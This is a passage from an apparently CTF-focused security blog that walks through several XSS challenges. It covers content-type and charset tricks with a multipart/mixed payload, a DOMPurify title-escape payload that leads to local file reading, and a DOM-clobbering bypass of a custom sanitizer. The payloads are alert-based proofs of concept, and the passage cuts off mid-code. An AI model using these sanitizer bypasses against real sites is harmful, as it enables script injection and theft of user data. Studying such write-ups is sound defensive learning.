punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'hello, world'</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/<span class="token interpolation"><span class="token variable">$type</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"X-Frame-Options: DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"plain"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"the message is: <span class="token interpolation"><span class="token variable">$message</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>The message is:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/([^\s\w!-~]|")/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>solved by:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span> nobody yet!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You can control part of the content and part of the content type. How can you achieve XSS?</p><p>The first trick is to set the content type to <code>text/html; charset=UTF-16LE</code>, which allows the browser to interpret the page as UTF16 and control the output content.</p><p>This trick reminds me of the “modernism” challenge in <a href="https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/">UIUCTF 2022</a>.</p><p>The second trick is to utilize the feature of the content type header. When the response header is <code>Content-Type: text/x,image/gif</code>, because <code>text/x</code> is an invalid content type, the browser will prioritize the valid <code>image/gif</code>.</p><p>In other words, even though the first half of the content type is hardcoded, you can still use this technique to override the complete content type. There is an old content type called <code>multipart/mixed</code>, which is like the response version of multipart&#x2F;form and can output a response like this:</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKContent-type: multipart&#x2F;mixed;boundary&#x3D;&quot;8ormorebytes&quot;ignored_first_part_before_boundary--8ormorebytesContent-Type: text&#x2F;html&lt;img src&#x3D;x onerror&#x3D;alert(domain)&gt;--8ormorebytesignored_last_part<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The browser will render the part it understands, and Firefox supports this content type.</p><p>This content type could be used to bypass CSP as well. You can refer to this link: <a href="https://twitter.com/ankursundara/status/1723410507389129092">https://twitter.com/ankursundara/status/1723410507389129092</a></p><h2><span id="intigriti-october-2023-challenge">Intigriti October 2023 challenge</span></h2><p>Challenge: <a href="https://challenge-1023.intigriti.io/">https://challenge-1023.intigriti.io/</a></p><p>There is an injection point in the backend:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge - &lt;%- title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>This title comes from:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getTitle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">path</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    path <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although it seems that DOMPurify cannot be bypassed, you can actually close the preceding <code>&lt;title&gt;</code> tag by using <code>&lt;div id=&quot;&lt;/title&gt;&lt;h1&gt;hello&lt;/h1&gt;&quot;&gt;</code>, allowing you to inject any tag.</p><p>However, the input for this challenge comes from the path, so some <code>/</code> characters need to be removed. Here, the <code>/</code> is replaced with <code>&amp;sol;</code> because <code>innerHTML</code> decodes attributes. Finally, the following payload is constructed:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&lt;p id&#x3D;&quot;&lt;%26sol%3Btitle&gt;&lt;script&gt;alert()&lt;%26sol%3Bscript&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The goal of this challenge is to read a local file, so XSS is not enough. The next step is to find a way to extend from XSS.</p><p>The flag for this challenge has <code>--disable-web-security</code>, so SOP is disabled, allowing access to responses from other sources. However, CDP has restrictions on origin and cannot be fully used, but some functionalities are available, such as opening a new webpage.</p><p>Since the file is local, only files starting with <code>file:///</code> can be read. Therefore, the goal is to find a way to create a file locally.</p><p>The solution is to trigger the download feature, which is enabled by default in the new headless mode. Once the download is triggered, the file will be saved to a fixed location. It can then be opened using CDP.</p><p>Author’s writeup: <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">https://mizu.re/post/intigriti-october-2023-xss-challenge</a></p><h2><span id="dom-clobbering">DOM clobbering</span></h2><p>Source: <a href="https://twitter.com/kevin_mizu/status/1697625861543923906">https://twitter.com/kevin_mizu&#x2F;status&#x2F;1697625861543923906</a></p><p>The challenge is a homemade sanitizer:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Sanitizer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360</span>    <span class="token constant">DEFAULT_TAGS</span>  <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token comment">/* ... */</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">config<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>version <span class="token operator">=</span> <span class="token string">"2.0.0"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>creator <span class="token operator">=</span> <span class="token string">"@kevin_mizu"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span>            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"body"</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">tag</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span>            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">attr</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924</span>    <span class="token function-variable function">_isClobbered</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">elm</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            elm <span class="token keyword">instanceof</span> <span class="token class-name">HTMLFormElement</span> <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span><span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>nodeName <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>textContent <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeChild <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token operator">!</span><span class="token punctuation">(</span>elm<span class="token punctuation">.</span>attributes <span class="token keyword">instanceof</span> <span class="token class-name">NamedNodeMap</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>setAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>insertBefore <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>hasChildNodes <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028</span>    <span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>        <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>                    childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    currentNode<span class="token punctuation">.</span>nextSibling                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function-variable function">sanitize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> currentNode<span class="token punctuation">;</span>        <span class="token keyword">var</span> dom_tree <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseFromString</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> nodeIterator <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>dom_tree<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>currentNode <span class="token operator">=</span> nodeIterator<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// avoid DOMClobbering</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isClobbered</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> currentNode<span class="token punctuation">.</span>nodeType <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">case</span> currentNode<span class="token punctuation">.</span><span class="token constant">ELEMENT_NODE</span><span class="token operator">:</span>                    <span class="token keyword">var</span> tag_name   <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>nodeName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> attributes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>attributes<span class="token punctuation">;</span>                    <span class="token comment">// avoid mXSS</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token comment">// sanitize tags</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token comment">// sanitize attributes</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">continue</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dom_tree<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It references many other sanitizer libraries, such as DOMPurify.</p><p>The key to this challenge is the DOM clobbering of forms, which is usually done like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>By placing the element inside a form, <code>test.x</code> can be polluted.</p><p>However, there is another trick using the <code>form</code> attribute to place the element outside:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>In this challenge, when removing elements, the sanitizer does it like this:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>    <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>                childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                currentNode<span class="token punctuation">.</span>nextSibling            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It inserts the nodes under the element to be deleted into the parent’s <code>nextSibling</code>.</p><p>Therefore, if the <code>nextSibling</code> is clobbered and the following structure is created:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nextSibling</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nodeName</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When removing the <code>&lt;form&gt;</code>, all the nodes underneath will be inserted after <code>&lt;input form=test name=nextSibling&gt;</code>, bypassing the sanitizer.</p><p>This is a really interesting challenge! Although I knew about the <code>form</code> attribute, I never thought it could be used in combination with DOM clobbering.</p><p>Author’s writeup: <a href="https://twitter.com/kevin_mizu/status/1701922141791211776">https://twitter.com/kevin_mizu&#x2F;status&#x2F;1701922141791211776</a></p><h2><span id="lakectf-2023-geoguessy">LakeCTF 2023 GeoGuessy</span></h2><p>The source is referenced from this writeup: <a href="https://www.xanhacks.xyz/p/lakectf2023-geoguessy/">XSS, Race Condition, XS-Leaks and CSP &amp; iframe’s sandbox bypass - LakeCTF 2023 GeoGuessy</a></p><p>Let’s start with two interesting unintended issues. The first one is exploiting the feature of cookies not considering the port, allowing the retrieval of cookies using XSS from other challenges. If there is no proper isolation between different challenges, this can happen, as seen in <a href="https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/#leakless-note">SekaiCTF 2023 - leakless note</a>.</p><p>The second one is a race condition caused by bad coding practices.</p><p>When accessing the page, the user is set as a global variable:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>cookies<span class="token operator">?.</span>token<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         isPremium <span class="token operator">=</span> user<span class="token punctuation">.</span>isPremium        username <span class="token operator">=</span> user<span class="token punctuation">.</span>username        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> isPremium<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then, when updating the user, a similar pattern is used. After obtaining the user, the data is modified and written:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/updateUser'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span 